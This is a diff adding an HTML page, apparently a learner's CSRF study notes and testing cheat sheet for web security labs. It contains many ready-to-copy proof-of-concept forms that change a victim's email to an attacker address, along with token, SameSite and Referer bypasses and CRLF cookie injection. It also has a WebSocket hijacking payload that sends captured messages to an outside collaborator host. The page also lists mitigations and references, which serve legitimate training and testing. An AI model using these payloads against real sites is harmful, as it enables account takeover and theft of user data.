+  <span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/change-email"</span> <span class="attr">method</span>=<span class="str">"POST"</span> <span class="attr">id</span>=<span class="str">"csrf"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span><span class="tag-c">&gt;</span>
+  <span class="tag-c">&lt;/form&gt;</span>
+  <span class="tag-c">&lt;script&gt;</span><span class="fn">document.getElementById</span>(<span class="str">"csrf"</span>).<span class="fn">submit</span>();<span class="tag-c">&lt;/script&gt;</span>
+<span class="tag-c">&lt;/body&gt;&lt;/html&gt;</span></code></pre>
+    </div>
+
+    <h3>GET-Based PoC</h3>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — get poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;img</span> <span class="attr">src</span>=<span class="str">"https://TARGET.com/change-email?email=attacker@evil.com"</span> <span class="attr">width</span>=<span class="str">"0"</span> <span class="attr">height</span>=<span class="str">"0"</span><span class="tag-c">&gt;</span></code></pre>
+    </div>
+
+    <h3>With Redirect (hide the attack)</h3>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — with redirect</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/update_email.php"</span> <span class="attr">method</span>=<span class="str">"POST"</span> <span class="attr">id</span>=<span class="str">"attack"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evilmail.com"</span><span class="tag-c">&gt;</span>
+<span class="tag-c">&lt;/form&gt;</span>
+<span class="tag-c">&lt;script&gt;</span>
+    <span class="fn">document.getElementById</span>(<span class="str">"attack"</span>).<span class="fn">submit</span>();
+    <span class="fn">setTimeout</span>(<span class="kw">function</span>() {
+        window.location.href = <span class="str">"https://TARGET.com/settings.php"</span>;
+    }, <span class="val">1000</span>);
+<span class="tag-c">&lt;/script&gt;</span></code></pre>
+    </div>
+  </section>
+
+  <!-- ───── TOKEN BYPASS ───────────────────────────────────── -->
+  <section id="token-bypass">
+    <div class="section-header">
+      <span class="section-number">13</span>
+      <h2>Bypassing CSRF Token Validation</h2>
+    </div>
+
+    <div class="bypass-card" id="token-bp-1">
+      <div class="bypass-card-header">
+        <div class="bypass-num">1</div>
+        <div class="bypass-card-title">Token Validated Only on POST → Switch to GET</div>
+      </div>
+      <div class="bypass-card-body">
+        <p>The app checks the token for POST but skips validation for GET. Change the method in Burp Repeater and move body params to the URL.</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">html — poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code><span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/my-account/change-email"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span><span class="tag-c">&gt;</span>
+<span class="tag-c">&lt;/form&gt;</span>
+<span class="tag-c">&lt;script&gt;</span><span class="fn">document.forms</span>[<span class="val">0</span>].<span class="fn">submit</span>();<span class="tag-c">&lt;/script&gt;</span></code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="bypass-card" id="token-bp-2">
+      <div class="bypass-card-header">
+        <div class="bypass-num">2</div>
+        <div class="bypass-card-title">Token Validated Only if Present → Remove It</div>
+      </div>
+      <div class="bypass-card-body">
+        <p>If the token exists the app validates it, but if the <strong>entire parameter is omitted</strong>, validation is skipped entirely. Don't just empty the value — remove the <code>csrf=...</code> parameter completely from the request.</p>
+      </div>
+    </div>
+
+    <div class="bypass-card" id="token-bp-3">
+      <div class="bypass-card-header">
+        <div class="bypass-num">3</div>
+        <div class="bypass-card-title">Token Not Tied to User Session</div>
+      </div>
+      <div class="bypass-card-body">
+        <p>The app uses a global token pool — any issued token is valid for any user. Log into Account A, grab a valid token, use it in a forged request targeting Account B's session.</p>
+      </div>
+    </div>
+
+    <div class="bypass-card" id="token-bp-4">
+      <div class="bypass-card-header">
+        <div class="bypass-num">4</div>
+        <div class="bypass-card-title">Token Tied to Non-Session Cookie (CRLF Injection)</div>
+      </div>
+      <div class="bypass-card-body">
+        <p>The app validates the CSRF token against a <code>csrfKey</code> cookie — separate from the session. You can inject your own <code>csrfKey</code> into the victim's browser via CRLF injection, then use your matching token.</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">— step 1: inject csrfKey via CRLF</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code>https://TARGET.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None</code></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">html — full poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code><span class="tag-c">&lt;html&gt;&lt;body&gt;</span>
+  <span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/my-account/change-email"</span> <span class="attr">method</span>=<span class="str">"POST"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span> <span class="tag-c">/&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"csrf"</span> <span class="attr">value</span>=<span class="str">"YOUR_CSRF_TOKEN"</span> <span class="tag-c">/&gt;</span>
+  <span class="tag-c">&lt;/form&gt;</span>
+  <span class="tag-c">&lt;img</span> <span class="attr">src</span>=<span class="str">"https://TARGET.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None"</span>
+       <span class="attr">onerror</span>=<span class="str">"document.forms[0].submit()"</span><span class="tag-c">&gt;</span>
+<span class="tag-c">&lt;/body&gt;&lt;/html&gt;</span></code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="bypass-card" id="token-bp-5">
+      <div class="bypass-card-header">
+        <div class="bypass-num">5</div>
+        <div class="bypass-card-title">Token Duplicated in Cookie (Double Submit)</div>
+      </div>
+      <div class="bypass-card-body">
+        <p>The app checks that the <code>csrf</code> cookie matches the <code>csrf</code> body param — no server-side storage. Set both to the same value you control via CRLF or a cookie-setting gadget.</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">html — double submit bypass</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code><span class="tag-c">&lt;html&gt;&lt;body&gt;</span>
+  <span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/my-account/change-email"</span> <span class="attr">method</span>=<span class="str">"POST"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span> <span class="tag-c">/&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"csrf"</span> <span class="attr">value</span>=<span class="str">"fake"</span> <span class="tag-c">/&gt;</span>
+  <span class="tag-c">&lt;/form&gt;</span>
+  <span class="tag-c">&lt;img</span> <span class="attr">src</span>=<span class="str">"https://TARGET.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"</span>
+       <span class="attr">onerror</span>=<span class="str">"document.forms[0].submit();"</span> <span class="tag-c">/&gt;</span>
+<span class="tag-c">&lt;/body&gt;&lt;/html&gt;</span></code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="bypass-card" id="token-bp-6">
+      <div class="bypass-card-header">
+        <div class="bypass-num">6</div>
+        <div class="bypass-card-title">Weak / Predictable Token</div>
+      </div>
+      <div class="bypass-card-body">
+        <p>Token is derived from predictable data (user role, username, ID). Try base64-decoding it.</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">— decode the token</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code><span class="com"># Value in form: YWRtaW4=</span>
+$ echo "YWRtaW4=" | base64 -d
+admin   <span class="com"># Token is just the user's role!</span></code></pre>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───── SAMESITE BYPASS ────────────────────────────────── -->
+  <section id="samesite-bypass">
+    <div class="section-header">
+      <span class="section-number">14</span>
+      <h2>Bypassing SameSite Cookie Protections</h2>
+    </div>
+
+    <h3 id="ss-lax-get">Lax — via GET Request</h3>
+    <p>Lax allows cookies on top-level GET navigations. If the state-changing action accepts GET, CSRF is trivial.</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;img</span> <span class="attr">src</span>=<span class="str">"https://TARGET.com/action?param=value"</span> <span class="attr">width</span>=<span class="str">"0"</span> <span class="attr">height</span>=<span class="str">"0"</span><span class="tag-c">&gt;</span></code></pre>
+    </div>
+
+    <h3 id="ss-lax-method">Lax — via Method Override</h3>
+    <p>Some frameworks support <code>_method=POST</code> to override the HTTP method. Browser sends GET (Lax permits), server processes as POST.</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — method override poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;html&gt;&lt;body&gt;</span>
+  <span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/my-account/change-email"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span> <span class="tag-c">/&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"_method"</span> <span class="attr">value</span>=<span class="str">"POST"</span> <span class="tag-c">/&gt;</span>
+  <span class="tag-c">&lt;/form&gt;</span>
+  <span class="tag-c">&lt;script&gt;</span>
+    history.<span class="fn">pushState</span>(<span class="str">''</span>, <span class="str">''</span>, <span class="str">'/'</span>);
+    <span class="fn">document.forms</span>[<span class="val">0</span>].<span class="fn">submit</span>();
+  <span class="tag-c">&lt;/script&gt;</span>
+<span class="tag-c">&lt;/body&gt;&lt;/html&gt;</span></code></pre>
+    </div>
+
+    <h3 id="ss-lax-refresh">Lax — via Cookie Refresh (2-Minute Window)</h3>
+    <p>Force the victim to re-authenticate via OAuth. The fresh cookie has no SameSite attribute yet — Chrome's 2-minute rule allows POST for 120 seconds.</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — cookie refresh poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;form</span> <span class="attr">method</span>=<span class="str">"POST"</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/my-account/change-email"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span><span class="tag-c">&gt;</span>
+<span class="tag-c">&lt;/form&gt;</span>
+<span class="tag-c">&lt;script&gt;</span>
+    window.<span class="fn">open</span>(<span class="str">'https://TARGET.com/social-login'</span>);
+    <span class="fn">setTimeout</span>(<span class="kw">function</span>() {
+        <span class="fn">document.forms</span>[<span class="val">0</span>].<span class="fn">submit</span>();
+    }, <span class="val">5000</span>); <span class="com">// fire within 2-minute window</span>
+<span class="tag-c">&lt;/script&gt;</span></code></pre>
+    </div>
+
+    <h3 id="ss-strict-redirect">Strict — via Client-Side Redirect</h3>
+    <p>Strict blocks all cross-site requests. But if the target site has an open redirect or path traversal to a sensitive endpoint, the final request originates from the same site — valid.</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">— find the redirect gadget first</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code>GET /post/comment/confirmation?postId=3/../../my-account</code></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — strict bypass poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;html&gt;&lt;body&gt;</span>
+  <span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/post/comment/confirmation"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"postId"</span>
+           <span class="attr">value</span>=<span class="str">"3/../../my-account/change-email?email=attacker@evil.com&amp;submit=1"</span> <span class="tag-c">/&gt;</span>
+  <span class="tag-c">&lt;/form&gt;</span>
+  <span class="tag-c">&lt;script&gt;</span>
+    history.<span class="fn">pushState</span>(<span class="str">''</span>, <span class="str">''</span>, <span class="str">'/'</span>);
+    <span class="fn">document.forms</span>[<span class="val">0</span>].<span class="fn">submit</span>();
+  <span class="tag-c">&lt;/script&gt;</span>
+<span class="tag-c">&lt;/body&gt;&lt;/html&gt;</span></code></pre>
+    </div>
+    <div class="callout warning">Encode <code>&amp;</code> in <code>submit=1</code> as <code>%26</code> so it stays part of the <code>postId</code> value, not a separate form field.</div>
+
+    <h3 id="ss-strict-sibling">Strict — via Sibling Domain + WebSocket Hijacking</h3>
+    <p>Subdomains are same-site. XSS on <code>cms.example.com</code> = same-site requests to <code>example.com</code> = Strict bypass. Use this to deliver CSWSH payloads.</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">javascript — cswsh payload</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="kw">var</span> ws = <span class="kw">new</span> <span class="fn">WebSocket</span>(<span class="str">'wss://TARGET.com/chat'</span>);
+ws.<span class="fn">onopen</span> = <span class="kw">function</span>() { ws.<span class="fn">send</span>(<span class="str">"READY"</span>); };
+ws.<span class="fn">onmessage</span> = <span class="kw">function</span>(event) {
+    <span class="fn">fetch</span>(<span class="str">'https://COLLABORATOR.oastify.com'</span>, {
+        <span class="attr">method</span>: <span class="str">'POST'</span>, <span class="attr">mode</span>: <span class="str">'no-cors'</span>, <span class="attr">body</span>: event.data
+    });
+};</code></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — deliver via sibling domain xss</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;script&gt;</span>
+location = <span class="str">'https://cms.TARGET.com/login?username=&lt;script&gt;URLENCODED_WS_PAYLOAD&lt;/script&gt;&amp;password=a'</span>
+<span class="tag-c">&lt;/script&gt;</span></code></pre>
+    </div>
+  </section>
+
+  <!-- ───── REFERER BYPASS ─────────────────────────────────── -->
+  <section id="referer-bypass">
+    <div class="section-header">
+      <span class="section-number">15</span>
+      <h2>Bypassing Referer-Based Defenses</h2>
+    </div>
+
+    <h3>Drop It — Validated Only if Present</h3>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — suppress referer</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;html&gt;</span>
+<span class="tag-c">&lt;head&gt;&lt;meta</span> <span class="attr">name</span>=<span class="str">"referrer"</span> <span class="attr">content</span>=<span class="str">"no-referrer"</span><span class="tag-c">&gt;&lt;/head&gt;</span>
+<span class="tag-c">&lt;body&gt;</span>
+  <span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/my-account/change-email"</span> <span class="attr">method</span>=<span class="str">"POST"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span> <span class="tag-c">/&gt;</span>
+  <span class="tag-c">&lt;/form&gt;</span>
+  <span class="tag-c">&lt;script&gt;</span>history.<span class="fn">pushState</span>(<span class="str">''</span>, <span class="str">''</span>, <span class="str">'/'</span>); <span class="fn">document.forms</span>[<span class="val">0</span>].<span class="fn">submit</span>();<span class="tag-c">&lt;/script&gt;</span>
+<span class="tag-c">&lt;/body&gt;&lt;/html&gt;</span></code></pre>
+    </div>
+
+    <h3>Spoof It — Loose Domain Check</h3>
+    <p>If the app checks that the Referer <em>contains</em> the target domain anywhere, put the target domain in your URL's query string:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html — referer spoofing poc</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><code><span class="tag-c">&lt;html&gt;</span>
+<span class="tag-c">&lt;head&gt;&lt;meta</span> <span class="attr">name</span>=<span class="str">"referrer"</span> <span class="attr">content</span>=<span class="str">"unsafe-url"</span><span class="tag-c">&gt;&lt;/head&gt;</span>
+<span class="tag-c">&lt;body&gt;</span>
+  <span class="tag-c">&lt;form</span> <span class="attr">action</span>=<span class="str">"https://TARGET.com/my-account/change-email"</span> <span class="attr">method</span>=<span class="str">"POST"</span><span class="tag-c">&gt;</span>
+    <span class="tag-c">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"attacker@evil.com"</span> <span class="tag-c">/&gt;</span>
+  <span class="tag-c">&lt;/form&gt;</span>
+  <span class="tag-c">&lt;script&gt;</span>
+    history.<span class="fn">pushState</span>(<span class="str">""</span>, <span class="str">""</span>, <span class="str">"/?TARGET.com"</span>); <span class="com">// domain in our URL</span>
+    <span class="fn">document.forms</span>[<span class="val">0</span>].<span class="fn">submit</span>();
+  <span class="tag-c">&lt;/script&gt;</span>
+<span class="tag-c">&lt;/body&gt;&lt;/html&gt;</span></code></pre>
+    </div>
+    <div class="callout info">Many browsers strip query strings from the Referer by default. The <code>unsafe-url</code> meta referrer policy forces the full URL to be sent.</div>
+  </section>
+
+  <!-- ───── IMPACT ─────────────────────────────────────────── -->
+  <section id="impact">
+    <div class="section-header">
+      <span class="section-number">16</span>
+      <h2>Impact of CSRF</h2>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Impact</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Account takeover</strong></td><td>Change email or password → full account control</td></tr>
+          <tr><td><strong>Privilege escalation</strong></td><td>Change user role to admin</td></tr>
+          <tr><td><strong>Financial loss</strong></td><td>Initiate transfers or purchases</td></tr>
+          <tr><td><strong>Data modification</strong></td><td>Update profile, settings, preferences silently</td></tr>
+          <tr><td><strong>Unauthorised deletion</strong></td><td>Delete posts, accounts, records</td></tr>
+          <tr><td><strong>Session DoS</strong></td><td>Force victims to be logged out</td></tr>
+          <tr><td><strong>Chained with XSS</strong></td><td>XSS reads CSRF tokens → any action possible</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ───── MITIGATIONS ────────────────────────────────────── -->
+  <section id="mitigations">
+    <div class="section-header">
+      <span class="section-number">17</span>
+      <h2>Mitigations</h2>
+    </div>
+    <h3>Anti-CSRF Tokens (Primary Defence)</h3>
+    <ul>
+      <li>Generate per-session tokens using a cryptographically secure PRNG (CSPRNG), seeded with timestamp + static secret</li>
+      <li>Tie the token to the user's session — validate server-side on every state-changing request</li>
+      <li>Custom request headers (<code>X-CSRF-Token</code>) also work — browsers block custom headers cross-origin without CORS</li>
+    </ul>
+    <h3>SameSite Cookie Attribute</h3>
+    <ul>
+      <li>Set <code>SameSite=Strict</code> for maximum protection on session cookies</li>
+      <li><code>SameSite=Lax</code> is the Chrome default and provides good baseline protection</li>
+      <li>Never use <code>SameSite=None</code> unless strictly required for legitimate cross-site flows</li>
+    </ul>
+    <h3>Origin / Referer Header Validation</h3>
+    <ul>
+      <li>Prefer the <code>Origin</code> header over <code>Referer</code> — it only exposes scheme+host+port, not the full path</li>
+      <li>Never use Referer alone as the primary defence</li>
+    </ul>
+    <h3>Double-Submit Cookie (Stateless)</h3>
+    <ul>
+      <li>Only safe if you're certain there are no cookie injection vulnerabilities in the application or its subdomains</li>
+    </ul>
+    <h3>Require Re-authentication</h3>
+    <ul>
+      <li>For critical actions (password/email change), require the current password before proceeding</li>
+    </ul>
+  </section>
+
+  <!-- ───── CHECKLIST ──────────────────────────────────────── -->
+  <section id="checklist">
+    <div class="section-header">
+      <span class="section-number">18</span>
+      <h2>Testing Checklist</h2>
+    </div>
+    <p>Run through this on every state-changing endpoint:</p>
+    <ul class="checklist">
+      <li class="high">No CSRF token at all → build PoC, test immediately</li>
+      <li class="high">Remove CSRF token entirely → does action still succeed?</li>
+      <li class="high">Change POST → GET → does it still work?</li>
+      <li class="med">Replace token with a random value → accepted?</li>
+      <li class="med">Use your own token on victim's request → not tied to session?</li>
+      <li class="med">Base64/hex decode the token → predictable / derived from user data?</li>
+      <li>Check SameSite attribute on session cookie (Strict / Lax / None / missing)</li>
+      <li>If Lax → can you trigger state change via GET? Try <code>_method=POST</code> override</li>
+      <li>If Lax → is OAuth / social login present? → 2-minute cookie refresh window</li>
+      <li>If Strict → look for open redirects or path traversal on the same site</li>
+      <li>Check if Referer header is validated → try removing it</li>
+      <li>If Referer validated → try subdomain spoof or query string spoof</li>
+      <li>Look for CRLF injection (<code>%0d%0a</code>) in any cookie-setting endpoint → csrfKey injection</li>
+      <li>Any WebSockets? → Check for CSWSH (no origin check + session cookie auth)</li>
+      <li class="high">Sibling domains present (cms., staging., dev.)? → XSS there = same-site bypass</li>
+    </ul>
+  </section>
+
+  <!-- ───── H1 REPORTS ─────────────────────────────────────── -->
+  <section id="h1reports">
+    <div class="section-header">
+      <span class="section-number">19</span>
+      <h2>HackerOne Reports</h2>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Title</th><th>Report</th></tr></thead>
+        <tbody>
+          <tr><td>CSRF token remains same after user logs in</td><td><a href="https://hackerone.com/reports/49974" target="_blank">H1 #49974</a></td></tr>
+          <tr><td>Login CSRF vulnerability on HackerOne</td><td><a href="https://hackerone.com/reports/834366" target="_blank">H1 #834366</a></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ───── REFERENCES ─────────────────────────────────────── -->
+  <section id="references">
+    <div class="section-header">
+      <span class="section-number">20</span>
+      <h2>References</h2>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Resource</th><th>Link</th></tr></thead>
+        <tbody>
+          <tr><td>PortSwigger CSRF Path</td><td><a href="https://portswigger.net/web-security/csrf" target="_blank">portswigger.net</a></td></tr>
+          <tr><td>OWASP CSRF Cheatsheet</td><td><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">owasp.org</a></td></tr>
+          <tr><td>TryHackMe CSRF Intro</td><td><a href="https://tryhackme.com/room/csrfintroduction" target="_blank">tryhackme.com</a></td></tr>
+          <tr><td>TryHackMe CSRF v2</td><td><a href="https://tryhackme.com/room/csrfV2" target="_blank">tryhackme.com</a></td></tr>
+          <tr><td>HTB SecNotes Writeup</td><td><a href="https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html" target="_blank">0xdf.gitlab.io</a></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <h3>Videos</h3>
+    <ul>
+      <li><a href="https://www.youtube.com/watch?v=vRBihr41JTo" target="_blank">CSRF Explained</a></li>
+      <li><a href="https://www.youtube.com/watch?v=rMbHiV3tb7A" target="_blank">CSRF Deep Dive</a></li>
+      <li><a href="https://www.youtube.com/watch?v=fAz17N2MbPg" target="_blank">CSRF Attack Demo</a></li>
+      <li><a href="https://www.youtube.com/watch?v=3pHFsny6jDw" target="_blank">Advanced CSRF</a></li>
+    </ul>
+  </section>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    <div class="footer-left">
+      <span>CSRF Complete Notes — <span class="accent">l1nuxkid</span></span>
+      <span>PortSwigger · HTB · TryHackMe</span>
+    </div>
+    <span>⚠️ Focus: SameSite bypass chains · CRLF + csrfKey injection · CSWSH</span>
+  </div>
+
+</main>
+
+<script>
+  // ── Copy buttons ──────────────────────────────────────────
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    const text = pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  // ── Active sidebar link on scroll ────────────────────────
+  const sections = document.querySelectorAll('section[id], div[id]');
+  const navLinks = document.querySelectorAll('#sidebar .sidebar-nav a');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        navLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`#sidebar a[href="#${entry.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-20% 0px -75% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
